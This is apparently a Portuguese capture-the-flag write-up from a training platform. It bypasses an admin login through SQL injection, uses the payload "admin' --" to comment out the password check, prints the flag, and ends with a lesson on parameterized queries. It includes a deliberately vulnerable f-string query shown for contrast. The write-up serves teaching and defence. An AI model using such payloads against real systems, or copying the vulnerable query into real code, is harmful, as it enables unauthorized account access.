# Bypass de login via SQL Injection

| | |
|---|---|
| **Categoria** | Web |
| **Plataforma** | Ambiente de treino |
| **Dificuldade** | Médio |

## Enunciado

> Entre como administrador sem conhecer a senha.

## Recon

Formulário de login clássico (`usuário` + `senha`) via `POST /login`. Sem rate limiting aparente,
sem CSRF token — já sinaliza uma aplicação com pouca maturidade de segurança.

## Enumeração

Testei um caractere que costuma quebrar queries SQL mal construídas — uma aspa simples no campo de
usuário:

```
usuário: admin'
senha:   qualquer
```

A resposta trouxe um **erro de SQL** vazado na página, confirmando que a entrada é concatenada
direto na query. O erro sugeria algo como:

```sql
SELECT * FROM users WHERE username = 'admin'' AND password = '...'
```

## Vetor

**SQL Injection** em query de autenticação construída por concatenação de strings. Dá para alterar
a lógica do `WHERE` para que ela seja sempre verdadeira.

## Exploração

Comentando o resto da query e forçando uma condição verdadeira:

```
usuário: admin' --
senha:   (vazio)
```

A query efetiva vira:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```

O `--` comenta a checagem de senha; o backend retorna a linha do `admin` e autentica a sessão.

## Flag

```
flag{sqli_auth_bypass_use_prepared_statements}
```

## Lição

**A03:2021 – Injection.** A causa raiz é construir SQL concatenando entrada do usuário. A correção
definitiva são **prepared statements / queries parametrizadas**, que separam código de dados:

```python
# vulnerável
cur.execute(f"SELECT * FROM users WHERE username = '{u}' AND password = '{p}'")

# seguro
cur.execute("SELECT * FROM users WHERE username = %s AND password = %s", (u, p))
```

Camadas adicionais: nunca armazenar senha em texto puro (usar hash forte como Argon2/bcrypt),
não vazar erros de SQL ao cliente, aplicar WAF e rate limiting. Mas o controle primário é a query
parametrizada — o resto é defesa em profundidade.
